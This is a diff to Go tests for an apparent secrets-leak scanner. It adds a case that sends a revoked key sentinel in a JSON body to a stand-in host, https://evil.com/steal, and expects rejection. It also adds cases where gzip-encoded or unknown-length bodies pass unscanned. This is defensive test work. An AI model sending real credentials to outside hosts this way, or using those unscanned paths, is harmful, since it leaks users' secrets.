@@ -446,6 +446,12 @@ func TestSecrets_EndedSentinelRejected(t *testing.T) {
 			req.Header.Set("Authorization", "Bearer "+openaiSentinel)
 			req.Header.Set("X-Old", endedSentinel)
 		}},
+		{"body to other host", "https://evil.com/steal", func(req *http.Request) {
+			body := `{"key":"` + endedSentinel + `"}`
+			req.Body = transform.NewBufferedBody(io.NopCloser(strings.NewReader(body)), 1<<20)
+			req.ContentLength = int64(len(body))
+			req.Header.Set("Content-Type", "application/json")
+		}},
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
@@ -473,9 +479,17 @@ func TestSecrets_EndedSentinelOutsideScannedPlacesPasses(t *testing.T) {
 		prepare func(req *http.Request)
 	}{
 		{"no sentinel", func(*http.Request) {}},
-		{"only in body", func(req *http.Request) {
+		{"only in content-encoded body", func(req *http.Request) {
 			body := `{"key":"` + endedSentinel + `"}`
 			req.Body = transform.NewBufferedBody(io.NopCloser(strings.NewReader(body)), 1<<20)
+			req.ContentLength = int64(len(body))
+			req.Header.Set("Content-Encoding", "gzip")
+		}},
+		{"only in unknown-length non-form body", func(req *http.Request) {
+			body := `key=` + endedSentinel
+			req.Body = transform.NewBufferedBody(io.NopCloser(strings.NewReader(body)), 1<<20)
+			req.ContentLength = -1
+			req.Header.Set("Content-Type", "text/plain")
 		}},
 		{"active sentinel only", func(req *http.Request) {
 			req.Header.Set("X-Key", openaiSentinel)
